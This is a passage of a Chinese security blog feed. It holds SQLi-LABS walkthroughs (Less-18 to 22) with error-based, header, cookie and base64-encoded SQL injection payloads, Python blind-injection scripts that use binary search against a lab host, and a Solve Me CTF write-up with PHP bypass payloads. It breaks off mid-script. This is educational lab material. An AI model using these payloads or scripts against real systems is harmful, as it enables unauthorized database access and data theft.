&#39;admin&#39;)&#39;</code><br>再尝试一下<code>1&#39; and &#39;1&#39;=&#39;1</code><br>出现回显没有报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your User Agent is: 1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p>现在就可以直接使用报错注入了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>从上一题开始这里的每一道题目都需要登陆一下才行<br>这一次回显的是在referer上面<br>尝试在referer上面测试1’ and ‘1’=’1<br>直接回显<br>说明这一次的注入点是在referer上面<br>然后像刚才一样直接报错就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&apos; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>登陆后发现很明显的cookie字样猜测应该是cookie注入<br>退出后尝试在http头处尝试cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;;</span><br></pre></td></tr></table></figure><p>出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;admin&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>应该是单引号闭合<br>再尝试<br><code>uname=admin&#39; or &#39;1&#39;=&#39;1</code>成功回显<br>下面就很好办了，直接报错注入就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>这一题明显发现uname那一部分经过了base64加密<br>我们加上单引号再尝试加密发送看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4n</span><br></pre></td></tr></table></figure><p>出现跟上一题一样的报错，看来是一样的了，就是加上base64加密而已</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>把上面这一串base64加密就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICcxJz0nMQ==</span><br></pre></td></tr></table></figure><p>直接回显你想要的东西，成功</p><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>这一题就是上一题的套路，只是把单引号笔换成了双引号而已</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4i</span><br></pre></td></tr></table></figure><p>出现报错<br>直接<code>admin&quot; or &quot;1&quot;=&quot;1</code> 闭合一下加密提交就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4iIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p>回显正常<br>开始报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><p>加密得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p>回显数据库成功</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>SQLi-LABS Page-1(Basic Challenges)的22题就已经全部完爆了<br>这里面的22道题目都是把一些常见的注入类型给过了一遍，我觉得大概都是四种类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">联合查询注入</span><br><span class="line">报错注入</span><br><span class="line">bool盲注</span><br><span class="line">时间盲注</span><br></pre></td></tr></table></figure><p>后面的从18关开始就开始是http头的注入，但无论是什么注入，关键是要找到注入点在哪里，然后用合适的方法去闭合相关语句，然后再用正常的语句去查询你所需要的信息就好了</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近啊先自己SQL注入确实不行，我只能拿出sql注入的基础部分来练练收了，这个实验环境是sqlilabs
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>二分查找在sql盲注里面的应用</title>
    <link href="0verwatch.top/2018/08/27/bin-search-sql/"/>
    <id>0verwatch.top/2018/08/27/bin-search-sql/</id>
    <published>2018-08-27T02:53:50.000Z</published>
    <updated>2018-08-27T02:57:04.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在重新复习SQL注入用了sqllabs这个靶场，发现在做盲注的时候自己写的脚本，就一直自增去盲注的话时间花费太大，所以就在看了看二分查找在这一方面的应用<br>确实快了不少，很久没有写过小脚本就手有点生疏了，赶紧记录一下<a id="more"></a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>二分查找又称折半查找，优点是比较次数少，查找速度快，平均性能好；其缺点是要求待查表为有序表，且插入删除困难。因此，折半查找方法适用于不经常变动而查找频繁的有序列表。首先，假设表中元素是按升序排列，将表中间位置记录的关键字与查找关键字比较，如果两者相等，则查找成功；否则利用中间位置记录将表分成前、后两个子表，如果中间位置记录的关键字大于查找关键字，则进一步查找前一子表，否则进一步查找后一子表。重复以上过程，直到找到满足条件的记录，使查找成功，或直到子表不存在为止，此时查找不成功。</p><h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p> 最优时间复杂度：O(1)<br> 最坏时间复杂度：O(logn)</p><p><img src="https://s1.ax1x.com/2018/08/27/Pqwqeg.png" alt="Pqwqeg.png"></p><p>可以自行对比一下两组代码的不同<br>这是自增的写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用=去作为判断条件</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">127</span>):</span><br><span class="line">payload = url.format(_ = i,__ = j)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans  = requests.get(payload)</span><br><span class="line"><span class="comment">#print ans.content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line"><span class="comment"># database = database + chr(j)</span></span><br><span class="line"><span class="comment"># print database</span></span><br><span class="line">table_name += chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>下面是使用二分法去搜索，我这里使用非递归的办法去实现二分查找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))&gt;&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用&gt;去作为判断条件</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>  i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):  <span class="comment">#这个地方可能会有些问题，数据库长度未知的时候过长会出现重复字母到时候自行删除即可</span></span><br><span class="line">min = <span class="number">65</span></span><br><span class="line">max = <span class="number">122</span></span><br><span class="line"><span class="keyword">while</span> abs(max - min) &gt; <span class="number">1</span>:</span><br><span class="line">mid = (max + min)//<span class="number">2</span></span><br><span class="line">payload = url.format(_=i,__ = mid)</span><br><span class="line">ans = requests.get(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">min = mid</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">max = mid</span><br><span class="line"></span><br><span class="line">database += chr(max)</span><br><span class="line"><span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/08/27/Pq0imF.png" alt="Pq0imF.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在重新复习SQL注入用了sqllabs这个靶场，发现在做盲注的时候自己写的脚本，就一直自增去盲注的话时间花费太大，所以就在看了看二分查找在这一方面的应用&lt;br&gt;确实快了不少，很久没有写过小脚本就手有点生疏了，赶紧记录一下
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="二分查找" scheme="0verwatch.top/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Solve Me解题记录</title>
    <link href="0verwatch.top/2018/08/14/Solve-Me-wp/"/>
    <id>0verwatch.top/2018/08/14/Solve-Me-wp/</id>
    <published>2018-08-14T10:23:48.000Z</published>
    <updated>2018-08-19T14:13:10.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前一阵子关注点在实战上，现在又回归CTF学习套路了，这个网站<a href="http://solveme.peng.kr" target="_blank" rel="noopener">http://solveme.peng.kr</a> 本来做了一半的题目，今天终于把他补完了，学到了炒鸡多的东西啊<a id="more"></a>~</p><p>##正文</p><h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h3><p>给出来一个密文和一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(hex2bin(strrev(bin2hex($flag)))), <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题直接反过来写代码即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$s = <span class="string">'1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(strrev(bin2hex(base64_decode($s))));</span><br></pre></td></tr></table></figure><h3 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'answer'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>($_GET[<span class="string">'answer'</span>] === <span class="string">'尊찢悼嚴隆'</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Wrong answer'</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题可以知道我们要传进get参数，但是<code>===</code>后面的内容不在可见的ASCII码范围内于是我们抓包看一下<br>找到对应字符串的ASCII码，我们知道单引号url编码为%27,两个27之间的就是那串字符串的ASCII码，<br>直接构造<code>payload：?answer=%f0%ee%c2%f5%d3%fa%e5%f1%d7%cc</code>,得到flag</p><h3 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            sleep((int)$_GET[<span class="string">'time'</span>]);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这一个题目我们运用了<code>int的强制转换</code>和<code>科学计数法</code><br>这个题目先使用科学计数法绕过前面的两个<code>time</code>以及<code>is_numeric</code>，最后通过int的阶段获取到flag，因为<code>60 * 60 * 24 * 30 * 2=5.184*10^6</code><br>现在的<code>payload：?time=5.185e6</code>,sleep大约5秒后出现flag<br>为什么出现这样的效果我们来测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> $time = <span class="string">'5.185e6'</span>;</span><br><span class="line"> $num1 = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>;</span><br><span class="line"> $num2 = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>;</span><br><span class="line"> var_dump(!is_numeric($time));</span><br><span class="line"> var_dump($time&gt;$num1);</span><br><span class="line"> var_dump($time&lt;$num2);</span><br><span class="line"> var_dump((int)$time);</span><br><span class="line"></span><br><span class="line">bool(<span class="keyword">false</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">int(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><h3 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h3><p>一开始上手这一个题目，发现什么头绪也没有，因为他的那些参数我一个都不知道，发现url有点奇怪后来就尝试着直接去访问<code>index.php</code>，网页顿了一下又回到了login.php，怀疑存在<code>302跳转</code>，于是抓包看一下，果然重定向到<code>login.php</code><br>但同时我们也得到flag</p><p>还有第二种方法，直接curl一下看情况<br><a href="https://imgchr.com/i/P21ZSH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P21ZSH.md.png" alt="P21ZSH.md.png"></a></p><h3 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">"/lib.php"</span>;</span><br><span class="line"></span><br><span class="line">   $url = urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">   $url_query = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">   $params = explode(<span class="string">"&amp;"</span>, $url_query);</span><br><span class="line">   <span class="keyword">foreach</span>($params <span class="keyword">as</span> $param)&#123;</span><br><span class="line"></span><br><span class="line">       $idx_equal = strpos($param, <span class="string">"="</span>);</span><br><span class="line">       <span class="keyword">if</span>($idx_equal === <span class="keyword">false</span>)&#123;</span><br><span class="line">           $key = $param;</span><br><span class="line">           $value = <span class="string">""</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           $key = substr($param, <span class="number">0</span>, $idx_equal);</span><br><span class="line">           $value = substr($param, $idx_equal + <span class="number">1</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(strpos($key, <span class="string">"do_you_want_flag"</span>) !== <span class="keyword">false</span> || strpos($value, <span class="string">"yes"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">"no hack"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do_you_want_flag'</span>]) &amp;&amp; $_GET[<span class="string">'do_you_want_flag'</span>] == <span class="string">"yes"</span>)&#123;</span><br><span class="line">       <span class="keyword">die</span>($flag);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这一个题目我们可以发现存在parse_url函数，这个函数有个漏洞可以用多个/符号去绕过，然后就不会执行<code>die(&quot;no hack&quot;)</code>;转而执行了下面的语句。<br>这里有篇方方土学长写过的总结:<a href="http://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">点我</a><br>构造的<code>payload：///?do_you_want_flag=yes</code><br>后来发现还有官方的解法，就是利用描点去绕过，从来都不知道还可以这样搞<br><code>http://urlfiltering.solveme.peng.kr/?%23&amp;do_you_want_flag=yes</code></p><p>#Hash collision</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'foo'</span>], $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strlen($_GET[<span class="string">'foo'</span>]) &gt; <span class="number">30</span> || strlen($_GET[<span class="string">'bar'</span>]) &gt; <span class="number">30</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">'foo'</span>] === $_GET[<span class="string">'bar'</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Same value'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'foo'</span>]) !== hash(<span class="string">'sha512'</span>, $_GET[<span class="string">'bar'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Different hash'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这种题目做了很多遍了，就是利用数组返回NULL去绕过，构造下面的payload</p><p><code>?foo[]=1&amp;bar[]=2</code></p><h3 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    $value = $_GET[<span class="string">'value'</span>];</span><br><span class="line"></span><br><span class="line">    $username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>]) <span class="keyword">unset</span>($username);</span><br><span class="line">        <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) <span class="keyword">unset</span>($value);</span><br><span class="line">        <span class="keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($username == <span class="string">'15th_HackingCamp'</span> &amp;&amp; md5($password) == md5(file_get_contents(<span class="string">'./secret.passwd'</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">            <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>发现要跟<code>./secret.passwd</code>路径下的内容一样，先去里面看一下，发现字符串<code>simple_passw0rd</code><br>这个题目get到了一个新的知识点</p><p>就是chr()这个函数再ASCII码超过255的时候会自动取余，我们利用这个特性去拼接username的字符串，于是写了个Python脚本构造payload: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 